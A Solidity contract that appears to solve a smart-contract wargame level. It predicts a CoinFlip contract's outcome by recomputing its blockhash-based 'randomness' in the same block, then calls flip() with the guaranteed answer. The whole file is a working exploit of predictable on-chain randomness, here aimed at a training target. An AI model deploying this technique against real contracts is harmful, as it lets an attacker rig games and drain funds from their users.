// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import '@openzeppelin/contracts/math/SafeMath.sol';
// import "github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol";

// We'll create a contract that interacts with the CoinFlip contract

// The CoinFlip contract uses the block number of the last mined block as its
//  source of randomness -- we can access this in our PsychicCoinFlip contract,
//  thereby allowing us to find out what the coin flip value is in CoinFlip

contract PsychicCoinFlip {
    // using SafeMath for uint256;

    address coinFlipAddress =
        address(0x563767596115d11Fe4E5f068b0B7563869213Ce4);

    // copy CoinFlip contract's FACTOR -- used to compute random value
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function psychicFlip() public returns (bytes memory) {
        // just copy how CoinFlip guesses what side the coin flipped to
        // uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 blockValue = uint256(blockhash(block.number - 1));
        // uint256 blockDiv = blockValue.div(FACTOR);
        uint256 blockDiv = blockValue / FACTOR;
        bool side = blockDiv == 1 ? true : false;

        // then call the CoinFlip flip() method with our "guess"
        bytes memory payload = abi.encodeWithSignature("flip(bool)", side);
        (bool success, bytes memory returnedData) = coinFlipAddress.call{
            value: 0
        }(payload);
        require(
            success,
            "psychicFlip() did not successfully called flip() with our psychic guess."
        );
        return returnedData;
    }
}
